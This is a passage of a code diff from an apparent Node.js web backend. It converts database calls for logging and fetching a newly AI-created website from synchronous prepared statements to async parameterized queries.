-    `).run('website', '🤖', `${req.user.username} created website "${name}" using AI model`,
-      JSON.stringify({ website_id: websiteId }), websiteId);
+    `, ['website', '🤖', `${req.user.username} created website "${name}" using AI model`,
+      JSON.stringify({ website_id: websiteId }), websiteId]);
 
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
 
     res.status(201).json({ message: 'Website created with AI successfully', website });
   } catch (err) {
